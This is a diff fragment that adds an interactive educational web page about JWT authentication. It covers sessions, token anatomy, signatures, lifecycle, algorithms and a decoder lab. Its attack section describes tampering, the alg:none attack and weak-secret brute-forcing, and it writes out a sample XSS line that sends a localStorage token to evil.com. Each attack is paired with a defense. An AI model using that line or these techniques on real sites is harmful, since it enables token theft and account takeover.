+    padding: 1rem 1.2rem;
+    margin: 1rem 0;
+    font-size: 0.9rem;
+    display: flex;
+    gap: 0.8rem;
+    align-items: flex-start;
+  }
+
+  /* SCROLL PROGRESS */
+  .scroll-progress {
+    position: fixed;
+    top: 56px;
+    left: 0;
+    height: 2px;
+    background: linear-gradient(90deg, var(--neon-green), var(--neon-blue));
+    z-index: 999;
+    transition: width 0.1s;
+    box-shadow: 0 0 8px rgba(0,255,136,0.5);
+  }
+
+  /* SECTION COUNTER */
+  .section-num {
+    position: absolute;
+    top: 80px;
+    right: 2rem;
+    font-family: var(--mono);
+    font-size: 4rem;
+    color: rgba(255,255,255,0.02);
+    font-weight: 900;
+    pointer-events: none;
+    user-select: none;
+  }
+
+  /* ===========================
+     RESPONSIVE
+  =========================== */
+  @media (max-width: 640px) {
+    .compare-grid { grid-template-columns: 1fr; }
+    .algo-compare { grid-template-columns: 1fr; }
+    .panel-grid { grid-template-columns: 1fr; }
+    .nav-links { display: none; }
+    h1 { font-size: 2rem; }
+    h2 { font-size: 1.5rem; }
+    .jwt-flow { min-width: 500px; }
+    .lifecycle-track { min-width: 500px; }
+  }
+
+  /* STAR BACKGROUND */
+  .stars {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    pointer-events: none;
+    z-index: 0;
+    overflow: hidden;
+  }
+
+  .star {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    background: white;
+    border-radius: 50%;
+    animation: twinkle var(--dur, 3s) infinite var(--delay, 0s);
+  }
+
+  @keyframes twinkle {
+    0%, 100% { opacity: 0.1; }
+    50% { opacity: 0.6; }
+  }
+
+  section > * { position: relative; z-index: 1; }
+
+  /* HIGHLIGHT ROW */
+  .highlight-row {
+    background: rgba(0,255,136,0.04);
+    border: 1px solid rgba(0,255,136,0.15);
+    border-radius: 6px;
+    padding: 1rem;
+    margin: 1rem 0;
+    font-family: var(--mono);
+    font-size: 0.9rem;
+    color: var(--neon-green);
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+
+<!-- STARS -->
+<div class="stars" id="stars"></div>
+
+<!-- SCROLL PROGRESS -->
+<div class="scroll-progress" id="scrollProg"></div>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-logo">JWT_DECODED</div>
+  <ul class="nav-links">
+    <li><a href="#intro">Intro</a></li>
+    <li><a href="#session">Session</a></li>
+    <li><a href="#jwt-solution">JWT</a></li>
+    <li><a href="#comparison">Compare</a></li>
+    <li><a href="#jwt-structure">Structure</a></li>
+    <li><a href="#signature">Signature</a></li>
+    <li><a href="#attacks">Attacks</a></li>
+    <li><a href="#lifecycle">Lifecycle</a></li>
+    <li><a href="#api-request">API</a></li>
+    <li><a href="#advanced">Advanced</a></li>
+    <li><a href="#lab">Lab</a></li>
+  </ul>
+</nav>
+
+<!-- ==============================
+     SECTION 1: INTRO
+============================== -->
+<section id="intro">
+  <div class="section-inner">
+    <div class="section-tag">Module 01 // Authentication</div>
+    <h1 class="hero-title">
+      How Websites<br>
+      <span class="accent-green glow-green">Remember You</span><br>
+      After Login?
+    </h1>
+    <p class="hero-sub">You log in once. Browse for hours. The site always knows who you are. How does that actually work?</p>
+
+    <div class="login-anim" id="loginAnim">
+      <div class="anim-node">
+        <div class="anim-icon user" id="userIcon">👤</div>
+        <span class="anim-label">User</span>
+      </div>
+      <div class="anim-arrow">→</div>
+      <div class="anim-node">
+        <div class="anim-icon token-icon" id="loginAction">🔑</div>
+        <span class="anim-label">Login</span>
+      </div>
+      <div class="anim-arrow">→</div>
+      <div class="anim-node">
+        <div class="anim-icon server" id="serverIcon">🖥️</div>
+        <span class="anim-label">Website</span>
+      </div>
+      <div class="anim-arrow" id="responseArrow" style="animation-direction: reverse; color: var(--neon-blue);">→</div>
+      <div class="anim-node">
+        <div class="anim-icon" id="rememberIcon" style="border-color:#bb44ff;color:#bb44ff;background:rgba(187,68,255,0.08);">🧠</div>
+        <span class="anim-label">Remembered</span>
+      </div>
+    </div>
+
+    <div style="margin-top: 0.5rem; display: flex; gap: 1rem; flex-wrap: wrap;">
+      <a href="#session" class="btn btn-green">Start Learning ›</a>
+      <button class="btn btn-blue" onclick="playIntroAnim()">▶ Replay Animation</button>
+    </div>
+  </div>
+  <span class="section-num">01</span>
+</section>
+
+<hr class="section-divider">
+
+<!-- ==============================
+     SECTION 2: SESSION
+============================== -->
+<section id="session">
+  <div class="section-inner">
+    <div class="section-tag">Module 02 // Session-Based Auth</div>
+    <h2>The Old Way: <span class="accent-red">Sessions</span></h2>
+    <p>Before JWTs, servers used sessions — storing who's logged in inside their own memory.</p>
+
+    <button class="btn btn-blue" onclick="playSessionFlow()" style="margin-bottom: 1.5rem;">▶ Animate Flow</button>
+
+    <div class="session-flow" id="sessionFlow">
+      <div class="flow-step" data-step="0">
+        <div class="flow-step-num">1</div>
+        <div class="flow-step-text">👤 <strong>User</strong> sends username + password to server</div>
+      </div>
+      <div class="flow-step" data-step="1">
+        <div class="flow-step-num">2</div>
+        <div class="flow-step-text">🖥️ <strong>Server</strong> verifies credentials → creates a Session ID</div>
+      </div>
+      <div class="flow-step" data-step="2">
+        <div class="flow-step-num">3</div>
+        <div class="flow-step-text">💾 <strong>Session ID stored in server memory</strong> — e.g. <code style="font-family:var(--mono);color:var(--neon-blue);">sess_x9k2m → user:101</code></div>
+      </div>
+      <div class="flow-step" data-step="3">
+        <div class="flow-step-num">4</div>
+        <div class="flow-step-text">🍪 Server sends Session ID as a <strong>cookie</strong> to browser</div>
+      </div>
+      <div class="flow-step" data-step="4">
+        <div class="flow-step-num">5</div>
+        <div class="flow-step-text">📤 Every request, browser sends cookie → server looks up session in <strong>memory</strong></div>
+      </div>
+    </div>
+
+    <div class="server-memory" id="serverMemory">
+      <div class="server-box">
+        <div style="font-family:var(--mono);font-size:0.75rem;color:var(--neon-blue);">SERVER MEMORY</div>
+        <div class="memory-slots" id="memorySlots"></div>
+        <div style="font-size:0.75rem;color:var(--text-dim);margin-top:0.5rem;" id="memLabel">0 sessions</div>
+      </div>
+    </div>
+
+    <p style="margin-top: 1.5rem; color: var(--neon-red);">⚠️ Sounds fine... but what are the problems?</p>
+
+    <div class="problem-btns">
+      <button class="btn btn-red" onclick="simProblem('restart')">🔄 Server Restart</button>
+      <button class="btn btn-yellow" onclick="simProblem('traffic')">📈 High Traffic</button>
+      <button class="btn btn-blue" onclick="simProblem('multi')">🌐 Multiple Servers</button>
+    </div>
+
+    <div id="problem-output">Click a button above to simulate a problem</div>
+  </div>
+  <span class="section-num">02</span>
+</section>
+
+<hr class="section-divider">
+
+<!-- ==============================
+     SECTION 3: JWT SOLUTION
+============================== -->
+<section id="jwt-solution">
+  <div class="section-inner">
+    <div class="section-tag">Module 03 // JWT Auth</div>
+    <h2>The Modern Way: <span class="accent-green">JWT</span></h2>
+    <p><strong style="color:var(--neon-green);">Key Idea:</strong> Instead of server remembering you, <em>you carry a signed token proving who you are.</em></p>
+
+    <div class="highlight-row">💡 JWT = You prove your identity instead of server remembering you</div>
+
+    <button class="btn btn-green" onclick="playJwtFlow()" style="margin-bottom: 1.5rem;">▶ Animate JWT Flow</button>
+
+    <div class="jwt-flow-wrap">
+      <div class="jwt-flow" id="jwtFlow">
+        <div class="jwt-step" data-i="0"><div class="jwt-step-icon">🔑</div><div class="jwt-step-label">Login</div></div>
+        <div class="jwt-arrow">›</div>
+        <div class="jwt-step" data-i="1"><div class="jwt-step-icon">✅</div><div class="jwt-step-label">Verify</div></div>
+        <div class="jwt-arrow">›</div>
+        <div class="jwt-step" data-i="2"><div class="jwt-step-icon">🏭</div><div class="jwt-step-label">Generate<br>Token</div></div>
+        <div class="jwt-arrow">›</div>
+        <div class="jwt-step" data-i="3"><div class="jwt-step-icon">📤</div><div class="jwt-step-label">Send<br>Token</div></div>
+        <div class="jwt-arrow">›</div>
+        <div class="jwt-step" data-i="4"><div class="jwt-step-icon">💾</div><div class="jwt-step-label">Client<br>Stores</div></div>
+        <div class="jwt-arrow">›</div>
+        <div class="jwt-step" data-i="5"><div class="jwt-step-icon">📡</div><div class="jwt-step-label">Send with<br>Request</div></div>
+        <div class="jwt-arrow">›</div>
+        <div class="jwt-step" data-i="6"><div class="jwt-step-icon">🔐</div><div class="jwt-step-label">Server<br>Verifies</div></div>
+      </div>
+    </div>
+
+    <p style="margin-top: 1.5rem;">The token looks like this — three parts joined by dots:</p>
+
+    <div class="token-display">
+      <div class="token-part header">eyJhbGciOiJIUzI1NiJ9</div>
+      <div class="token-dot">.</div>
+      <div class="token-part payload">eyJ1c2VySWQiOjEwMX0</div>
+      <div class="token-dot">.</div>
+      <div class="token-part sig">SflKxwRJSMeKKF2QT4fw</div>
+    </div>
+
+    <div class="token-display" style="margin-top: 0.3rem; font-size: 0.75rem;">
+      <div class="token-part header" style="font-size:0.7rem;">HEADER</div>
+      <div class="token-dot">.</div>
+      <div class="token-part payload" style="font-size:0.7rem;">PAYLOAD</div>
+      <div class="token-dot">.</div>
+      <div class="token-part sig" style="font-size:0.7rem;">SIGNATURE</div>
+    </div>
+
+    <p style="margin-top: 1.5rem;">Token travels with every request:</p>
+    <div class="token-anim-container" id="tokenAnim">
+      <div class="anim-endpoints"><span>📱 Client</span><span>🖥️ Server</span></div>
+      <div class="moving-token" id="movingToken">eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOjEwMX0.SflKxwRJSMeKKF2QT4fw</div>
+    </div>
+    <button class="btn btn-green" onclick="animateToken()" style="margin-top: 0.5rem;">▶ Send Token</button>
+  </div>
+  <span class="section-num">03</span>
+</section>
+
+<hr class="section-divider">
+
+<!-- ==============================
+     SECTION 4: COMPARISON
+============================== -->
+<section id="comparison">
+  <div class="section-inner">
+    <div class="section-tag">Module 04 // Comparison</div>
+    <h2>Session <span class="accent-red">vs</span> JWT</h2>
+
+    <div class="compare-grid">
+      <div class="compare-card session-card">
+        <h3 class="accent-red">🔴 Session Auth</h3>
+        <div class="compare-item"><span class="compare-icon">💾</span> Server stores session data</div>
+        <div class="compare-item"><span class="compare-icon">🧠</span> Memory dependent</div>
+        <div class="compare-item"><span class="compare-icon">😰</span> Breaks on server restart</div>
+        <div class="compare-item"><span class="compare-icon">🌐</span> Hard to scale horizontally</div>
+        <div class="compare-item"><span class="compare-icon">🍪</span> Uses cookies (CSRF risk)</div>
+        <div class="compare-item"><span class="compare-icon">✅</span> Easy to revoke sessions</div>
+      </div>
+      <div class="compare-card jwt-card">
+        <h3 class="accent-green">🟢 JWT Auth</h3>
+        <div class="compare-item"><span class="compare-icon">🌊</span> Stateless — no server storage</div>
+        <div class="compare-item"><span class="compare-icon">📦</span> Data lives in token</div>
+        <div class="compare-item"><span class="compare-icon">💪</span> Survives server restarts</div>
+        <div class="compare-item"><span class="compare-icon">📈</span> Scales horizontally easily</div>
+        <div class="compare-item"><span class="compare-icon">📋</span> Sent in Authorization header</div>
+        <div class="compare-item"><span class="compare-icon">⏰</span> Auto-expires — not easy to revoke early</div>
+      </div>
+    </div>
+
+    <div class="info-box">
+      <div>ℹ️</div>
+      <div>Think of Session Auth like a <strong>coat check</strong> — the venue holds your coat (the data). JWT is like a <strong>wristband</strong> — you carry proof of entry yourself.</div>
+    </div>
+  </div>
+  <span class="section-num">04</span>
+</section>
+
+<hr class="section-divider">
+
+<!-- ==============================
+     SECTION 5: JWT STRUCTURE
+============================== -->
+<section id="jwt-structure">
+  <div class="section-inner">
+    <div class="section-tag">Module 05 // Token Anatomy</div>
+    <h2>Inside a <span class="accent-yellow">JWT Token</span></h2>
+    <p>Click each part to inspect its contents:</p>
+
+    <div class="structure-token">
+      <div class="struct-part hdr" onclick="showDetail('hdr')">
+        <span class="struct-label">Header</span>
+        <span class="struct-val">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>
+      </div>
+      <div class="struct-part pld" onclick="showDetail('pld')">
+        <span class="struct-label">Payload</span>
+        <span class="struct-val">eyJ1c2VySWQiOjEwMSwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDB9</span>
+      </div>
+      <div class="struct-part sgn" onclick="showDetail('sgn')">
+        <span class="struct-label">Signature</span>
+        <span class="struct-val">SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+      </div>
+    </div>
+
+    <div class="struct-detail" id="detail-hdr">
+      <div class="detail-panel hdr">
+        <h3 style="color:var(--neon-blue);">📋 Header — "What type of token and algorithm?"</h3>
+        <div class="code-block" style="margin-top:0.8rem;">
+<span style="color:var(--neon-blue)">{</span>
+  <span style="color:var(--text-dim)">"alg"</span>: <span style="color:var(--neon-yellow)">"HS256"</span>,   <span style="color:#4a6275">// Algorithm: HMAC SHA-256</span>
+  <span style="color:var(--text-dim)">"typ"</span>: <span style="color:var(--neon-yellow)">"JWT"</span>     <span style="color:#4a6275">// Token type</span>
+<span style="color:var(--neon-blue)">}</span></div>
+        <p class="detail-hint">🔵 The header is Base64URL encoded — not encrypted. Anyone can decode it!</p>
+      </div>
+    </div>
+
+    <div class="struct-detail" id="detail-pld">
+      <div class="detail-panel pld">
+        <h3 style="color:var(--neon-yellow);">📦 Payload — "Who are you and what can you do?"</h3>
+        <div class="code-block" style="margin-top:0.8rem;">
+<span style="color:var(--neon-yellow)">{</span>
+  <span style="color:var(--text-dim)">"userId"</span>: <span style="color:var(--neon-green)">101</span>,              <span style="color:#4a6275">// Who</span>
+  <span style="color:var(--text-dim)">"role"</span>: <span style="color:var(--neon-yellow)">"user"</span>,           <span style="color:#4a6275">// Permissions</span>
+  <span style="color:var(--text-dim)">"exp"</span>: <span style="color:var(--neon-green)">1700000000</span>,      <span style="color:#4a6275">// Expiry (unix timestamp)</span>
+  <span style="color:var(--text-dim)">"iat"</span>: <span style="color:var(--neon-green)">1699990000</span>       <span style="color:#4a6275">// Issued at</span>
+<span style="color:var(--neon-yellow)">}</span></div>
+        <p class="detail-hint">⚠️ Payload is also Base64URL encoded — NOT secret. Never put passwords here!</p>
+        <p class="detail-hint">These fields are called <strong>claims</strong>. Standard ones: sub, iss, exp, iat, aud.</p>
+      </div>
+    </div>
+
+    <div class="struct-detail" id="detail-sgn">
+      <div class="detail-panel sgn">
+        <h3 style="color:var(--neon-green);">🔐 Signature — "Tamper-proof seal"</h3>
+        <div class="code-block" style="margin-top:0.8rem;">
+HMACSHA256(
+  <span style="color:var(--neon-blue)">base64url(header)</span> + "." +
+  <span style="color:var(--neon-yellow)">base64url(payload)</span>,
+  <span style="color:var(--neon-red)">secretKey</span>           <span style="color:#4a6275">// Only server knows this!</span>
+)</div>
+        <p class="detail-hint">🔒 The signature is a cryptographic hash. If anyone modifies header or payload, the signature won't match and the server rejects the token.</p>
+      </div>
+    </div>
+  </div>
+  <span class="section-num">05</span>
+</section>
+
+<hr class="section-divider">
+
+<!-- ==============================
+     SECTION 6: SIGNATURE
+============================== -->
+<section id="signature">
+  <div class="section-inner">
+    <div class="section-tag">Module 06 // Core Security</div>
+    <h2>How the <span class="accent-green">Signature</span> Works</h2>
+    <p>The signature is what makes JWT secure. It's a one-way mathematical seal.</p>
+
+    <button class="btn btn-green sig-anim-btn" onclick="animateSig()">▶ Show Signing Process</button>
+
+    <div class="sig-formula" id="sigFormula">
+      <div class="sig-part" style="background:rgba(0,200,255,0.1);border:1px solid rgba(0,200,255,0.3);color:var(--neon-blue);" id="sf1">HEADER</div>
+      <div class="sig-op">+</div>
+      <div class="sig-part" style="background:rgba(255,204,0,0.1);border:1px solid rgba(255,204,0,0.3);color:var(--neon-yellow);" id="sf2">PAYLOAD</div>
+      <div class="sig-op">+</div>
+      <div class="sig-part" style="background:rgba(255,51,102,0.1);border:1px solid rgba(255,51,102,0.3);color:var(--neon-red);" id="sf3">SECRET KEY</div>
+      <div class="sig-op" id="sf4" style="opacity:0;">→</div>
+      <div class="sig-op" id="sf5" style="opacity:0;">HS256()</div>
+      <div class="sig-op" id="sf6" style="opacity:0;">=</div>
+      <div class="sig-result" id="sf7" style="opacity:0;">SflKxwRJSMeKKF2QT4fw...</div>
+    </div>
+
+    <div class="info-box">
+      <div>💡</div>
+      <div>The secret key <strong>never leaves the server</strong>. Without it, you can't generate a valid signature. This is why forging a JWT is computationally infeasible.</div>
+    </div>
+
+    <div class="warning-box">
+      <div class="warning-icon">⚠️</div>
+      <div>If the secret is weak (e.g. "secret" or "password"), attackers can brute-force it and forge their own tokens!</div>
+    </div>
+  </div>
+  <span class="section-num">06</span>
+</section>
+
+<hr class="section-divider">
+
+<!-- ==============================
+     SECTION 7: ATTACKS
+============================== -->
+<section id="attacks">
+  <div class="section-inner">
+    <div class="section-tag">Module 07 // Attack Simulations</div>
+    <h2><span class="accent-red">Attack</span> Scenarios</h2>
+    <p>Understanding how JWTs can be abused — and how to defend against it.</p>
+
+    <div class="attack-tabs">
+      <div class="attack-tab active" onclick="switchAttack('tamper', this)">💉 Payload Tampering</div>
+      <div class="attack-tab" onclick="switchAttack('xss', this)">🕷️ Token Theft (XSS)</div>
+      <div class="attack-tab" onclick="switchAttack('bf', this)">🔨 Weak Secret</div>
+    </div>
+
+    <!-- TAMPER -->
+    <div class="attack-panel active" id="attack-tamper">
+      <h3>Scenario: Change <code style="font-family:var(--mono);color:var(--neon-yellow);">role: "user"</code> → <code style="font-family:var(--mono);color:var(--neon-red);">role: "admin"</code></h3>
+      <p style="margin-top:0.5rem;font-size:0.9rem;">Can an attacker escalate their privileges by editing the token?</p>
+
+      <div class="role-selector">
+        <span style="font-family:var(--mono);font-size:0.85rem;color:var(--text-dim);">Set role to:</span>
+        <select class="role-select" id="roleSelect" onchange="updateTamper()">
+          <option value="user">user</option>
+          <option value="admin">admin</option>
+          <option value="superadmin">superadmin</option>
+        </select>
+        <span style="font-family:var(--mono);font-size:0.75rem;color:var(--text-dim);" id="tamperStatus">Original token</span>
+      </div>
+
+      <div class="tamper-token">
+        <div class="tamper-part hdr">eyJhbGciOiJIUzI1NiJ9</div>
+        <div class="token-dot" style="padding:0.8rem 0.3rem;background:var(--panel);">.</div>
+        <div class="tamper-part pld" id="tamperPayload">eyJ1c2VySWQiOjEwMSwicm9sZSI6InVzZXIifQ</div>
+        <div class="token-dot" style="padding:0.8rem 0.3rem;background:var(--panel);">.</div>
+        <div class="tamper-part sig-ok" id="tamperSig">SflKxwRJSMeKKF2QT4fw</div>
+      </div>
+
+      <button class="btn btn-red" onclick="sendTampered()" style="margin-top:1rem;">📤 Send to Server</button>
+
+      <div class="tamper-result" id="tamperResult"></div>
+    </div>
+
+    <!-- XSS -->
+    <div class="attack-panel" id="attack-xss">
+      <h3>Scenario: Attacker steals JWT from localStorage</h3>
+      <p style="margin-top:0.5rem;font-size:0.9rem;">If a site has an XSS vulnerability, an attacker's script can steal your token.</p>
+
+      <button class="btn btn-red" onclick="playXSS()">▶ Simulate Attack</button>
+
+      <div class="xss-scene" id="xssScene" style="margin-top:1rem;">
+        <div class="xss-step" data-x="0">
+          <div class="xss-step-icon">👤</div>
+          <div>Victim logs in → JWT stored in <code style="font-family:var(--mono);color:var(--neon-blue);">localStorage</code></div>
+        </div>
+        <div class="xss-step" data-x="1">
+          <div class="xss-step-icon">😈</div>
+          <div>Attacker injects malicious script via XSS: <code style="font-family:var(--mono);font-size:0.75rem;color:var(--neon-red);">fetch('evil.com?t='+localStorage.getItem('jwt'))</code></div>
+        </div>
+        <div class="xss-step" data-x="2">
+          <div class="xss-step-icon">📡</div>
+          <div>Token sent to attacker's server — <strong style="color:var(--neon-red);">stolen!</strong></div>
+        </div>
+        <div class="xss-step" data-x="3">
+          <div class="xss-step-icon">🤖</div>
+          <div>Attacker sends request with victim's token → Server thinks it's the victim</div>
+        </div>
+        <div class="xss-step" data-x="4">
+          <div class="xss-step-icon">✅</div>
+          <div style="color:var(--neon-red);">Server accepts! Attacker has full access as victim</div>
+        </div>
+      </div>
+
+      <div class="warning-box" style="margin-top:1rem;">
+        <div class="warning-icon">🛡️</div>
+        <div><strong>Defense:</strong> Store JWT in httpOnly cookies (not localStorage), implement Content Security Policy (CSP), validate and sanitize all inputs.</div>
+      </div>
+    </div>
+
+    <!-- BRUTE FORCE -->
+    <div class="attack-panel" id="attack-bf">
+      <h3>Scenario: Weak secret key brute-force</h3>
+      <p style="margin-top:0.5rem;font-size:0.9rem;">If the secret is "secret", attackers can try common words and forge admin tokens.</p>
+
+      <button class="btn btn-red" onclick="startBruteForce()" id="bfBtn">▶ Start Brute Force</button>
+
+      <div class="bf-progress"><div class="bf-bar" id="bfBar"></div></div>
+      <div class="bf-log" id="bfLog"><div class="log-line">// Awaiting brute force simulation...</div></div>
+    </div>
+  </div>
+  <span class="section-num">07</span>
+</section>
+
+<hr class="section-divider">
+
+<!-- ==============================
+     SECTION 8: LIFECYCLE
+============================== -->
+<section id="lifecycle">
+  <div class="section-inner">
+    <div class="section-tag">Module 08 // Token Lifecycle</div>
+    <h2>JWT <span class="accent-blue">Lifecycle</span></h2>
+    <p>A JWT has a defined lifespan — from birth to expiry.</p>
+
+    <div style="overflow-x:auto;">
+      <div class="lifecycle-track" id="lcTrack">
+        <div class="lc-step active" data-lc="0"><div class="lc-icon">🔑</div><div class="lc-label">LOGIN</div></div>
+        <div class="lc-step" data-lc="1"><div class="lc-icon">🏭</div><div class="lc-label">TOKEN CREATED</div></div>
+        <div class="lc-step" data-lc="2"><div class="lc-icon">📡</div><div class="lc-label">IN USE</div></div>
+        <div class="lc-step" data-lc="3"><div class="lc-icon">⏰</div><div class="lc-label">NEAR EXPIRY</div></div>
+        <div class="lc-step" data-lc="4"><div class="lc-icon">💀</div><div class="lc-label">EXPIRED</div></div>
+        <div class="lc-step" data-lc="5"><div class="lc-icon">🔄</div><div class="lc-label">LOGIN AGAIN</div></div>
+      </div>
+    </div>
+
+    <div class="expiry-timer">
+      <div>
+        <div class="timer-label">TOKEN EXPIRES IN</div>
+        <div class="timer-display" id="timerDisplay">00:30</div>
+      </div>
+      <div class="timer-bar"><div class="timer-fill" id="timerFill" style="width:100%"></div></div>
+      <div style="display:flex;flex-direction:column;gap:0.5rem;">
+        <button class="btn btn-green" onclick="startTimer()" style="font-size:0.75rem;padding:0.5rem 1rem;">▶ Start Timer</button>
+        <button class="btn btn-blue" onclick="resetTimer()" style="font-size:0.75rem;padding:0.5rem 1rem;">↺ Reset</button>
+      </div>
+    </div>
+
+    <div class="info-box" style="margin-top:1rem;">
+      <div>🔄</div>
+      <div>Use <strong>Refresh Tokens</strong> to silently get a new JWT before expiry — without forcing users to log in again.</div>
+    </div>
+  </div>
+  <span class="section-num">08</span>
+</section>
+
+<hr class="section-divider">
+
+<!-- ==============================
+     SECTION 9: API REQUEST
+============================== -->
+<section id="api-request">
+  <div class="section-inner">
+    <div class="section-tag">Module 09 // Real-World Usage</div>
+    <h2>JWT in an <span class="accent-blue">API Request</span></h2>
+    <p>JWT travels in the HTTP <code style="font-family:var(--mono);color:var(--neon-green);">Authorization</code> header as a Bearer token.</p>
+
+    <button class="btn btn-blue request-anim-btn" onclick="sendRequest()">▶ Send Request</button>
+
+    <div class="http-box">
+      <div class="http-bar">
+        <div class="http-method">GET</div>
+        <div class="http-url">/api/profile</div>
+        <div style="margin-left:auto;font-family:var(--mono);font-size:0.75rem;color:var(--text-dim);" id="reqStatus">HTTP/1.1</div>
+      </div>
+      <div class="http-body">
+        <span class="http-key">Host: </span><span class="http-val">api.example.com</span><br>
+        <span class="http-key">Content-Type: </span><span class="http-val">application/json</span><br>
+        <span class="http-key">Authorization: </span><span class="http-val">Bearer </span><span class="http-token-val" id="httpToken">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMSwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+      </div>
+    </div>
+
+    <div class="request-status" id="requestResult"></div>
+
+    <div class="panel" style="margin-top:1.5rem;">
+      <h3 style="margin-bottom:0.8rem;">📋 Server-side Verification Steps</h3>
+      <div class="flow-step visible" style="opacity:1;transform:none;margin:0.4rem 0;">
+        <div class="flow-step-num">1</div>
+        <div class="flow-step-text">Extract token from <code style="font-family:var(--mono);font-size:0.8rem;">Authorization: Bearer &lt;token&gt;</code></div>
+      </div>
+      <div class="flow-step visible" style="opacity:1;transform:none;margin:0.4rem 0;">
+        <div class="flow-step-num">2</div>
+        <div class="flow-step-text">Split into header.payload.signature</div>
+      </div>
+      <div class="flow-step visible" style="opacity:1;transform:none;margin:0.4rem 0;">
+        <div class="flow-step-num">3</div>
+        <div class="flow-step-text">Recalculate signature using header + payload + secret key</div>
+      </div>
+      <div class="flow-step visible" style="opacity:1;transform:none;margin:0.4rem 0;">
+        <div class="flow-step-num">4</div>
+        <div class="flow-step-text">Compare with token's signature → if match, <strong style="color:var(--neon-green);">accept</strong> else <strong style="color:var(--neon-red);">reject</strong></div>
+      </div>
+      <div class="flow-step visible" style="opacity:1;transform:none;margin:0.4rem 0;">
+        <div class="flow-step-num">5</div>
+        <div class="flow-step-text">Check <code style="font-family:var(--mono);font-size:0.8rem;">exp</code> claim — if expired, <strong style="color:var(--neon-red);">reject</strong></div>
+      </div>
+    </div>
+  </div>
+  <span class="section-num">09</span>
+</section>
+
+<hr class="section-divider">
+
+<!-- ==============================
+     SECTION 10: ADVANCED
+============================== -->
+<section id="advanced">
+  <div class="section-inner">
+    <div class="section-tag">Module 10 // Advanced Concepts</div>
+    <h2><span class="accent-purple">HS256</span> vs <span class="accent-blue">RS256</span></h2>
+    <p>Two algorithms to sign JWTs — each with different security tradeoffs.</p>
+
+    <div class="algo-compare">
+      <div class="algo-card hs">
+        <h3 class="accent-blue">HS256</h3>
+        <div class="algo-tag tag-sym">SYMMETRIC</div>
+        <div class="key-visual">🔑 ← single secret key</div>
+        <p style="font-size:0.9rem;">Same key is used to <strong>sign</strong> and <strong>verify</strong>.</p>
+        <ul class="algo-list">
+          <li>Simple to set up</li>
+          <li>Secret must be shared between parties</li>
+          <li>If key is leaked, tokens can be forged</li>
+          <li>Best for: monolithic apps, single server</li>
+        </ul>
+      </div>
+      <div class="algo-card rs">
+        <h3 class="accent-purple">RS256</h3>
+        <div class="algo-tag tag-asym">ASYMMETRIC</div>
+        <div class="key-visual">🔒 Private key (sign) + 🔓 Public key (verify)</div>
+        <p style="font-size:0.9rem;"><strong>Private key</strong> signs, <strong>public key</strong> verifies.</p>
+        <ul class="algo-list">
+          <li>More complex, more secure</li>
+          <li>Public key can be shared freely</li>
+          <li>Even if public key is leaked, can't forge tokens</li>
+          <li>Best for: microservices, third-party auth</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="warning-box">
+      <div class="warning-icon">🚨</div>
+      <div><strong>alg: none</strong> attack — Some old libraries accept tokens with <code style="font-family:var(--mono);">"alg": "none"</code> and no signature. Always explicitly validate the algorithm server-side!</div>
+    </div>
+
+    <div class="panel" style="margin-top:1rem;">
+      <h3 style="margin-bottom:1rem;">📚 Other JWT Best Practices</h3>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:0.8rem;">
+        <div class="flow-step visible" style="opacity:1;transform:none;">
+          <div class="flow-step-num" style="background:rgba(0,255,136,0.15);border-color:rgba(0,255,136,0.3);color:var(--neon-green);">✓</div>
+          <div class="flow-step-text" style="font-size:0.85rem;">Keep tokens short-lived (&lt; 15 min)</div>
+        </div>
+        <div class="flow-step visible" style="opacity:1;transform:none;">
+          <div class="flow-step-num" style="background:rgba(0,255,136,0.15);border-color:rgba(0,255,136,0.3);color:var(--neon-green);">✓</div>
+          <div class="flow-step-text" style="font-size:0.85rem;">Use HTTPS always</div>
+        </div>
+        <div class="flow-step visible" style="opacity:1;transform:none;">
+          <div class="flow-step-num" style="background:rgba(0,255,136,0.15);border-color:rgba(0,255,136,0.3);color:var(--neon-green);">✓</div>
+          <div class="flow-step-text" style="font-size:0.85rem;">Store in httpOnly cookies, not localStorage</div>
+        </div>
+        <div class="flow-step visible" style="opacity:1;transform:none;">
+          <div class="flow-step-num" style="background:rgba(0,255,136,0.15);border-color:rgba(0,255,136,0.3);color:var(--neon-green);">✓</div>
+          <div class="flow-step-text" style="font-size:0.85rem;">Use strong random secret (32+ bytes)</div>
+        </div>
+        <div class="flow-step visible" style="opacity:1;transform:none;">
+          <div class="flow-step-num" style="background:rgba(0,255,136,0.15);border-color:rgba(0,255,136,0.3);color:var(--neon-green);">✓</div>
+          <div class="flow-step-text" style="font-size:0.85rem;">Validate issuer (iss) and audience (aud)</div>
+        </div>
+        <div class="flow-step visible" style="opacity:1;transform:none;">
+          <div class="flow-step-num" style="background:rgba(0,255,136,0.15);border-color:rgba(0,255,136,0.3);color:var(--neon-green);">✓</div>
+          <div class="flow-step-text" style="font-size:0.85rem;">Implement token refresh pattern</div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <span class="section-num">10</span>
+</section>
+
+<hr class="section-divider">
+
+<!-- ==============================
+     SECTION 11: LAB
+============================== -->
+<section id="lab">
+  <div class="section-inner">
+    <div class="section-tag">Module 11 // Interactive Lab</div>
+    <h2>🧪 JWT <span class="accent-green">Playground</span></h2>
+    <p>Decode, inspect, and experiment with real JWT tokens.</p>
+
+    <div class="lab-section-title">INPUT TOKEN</div>
+    <textarea class="lab-input" id="labInput" placeholder="Paste a JWT token here...
+e.g. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMSwicm9sZSI6InVzZXIiLCJleHAiOjE3MDAwMDAwMDAsImlhdCI6MTY5OTk5MDAwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"></textarea>
+
+    <div class="lab-btns">
+      <button class="btn btn-green" onclick="labDecode()">🔍 Decode Token</button>
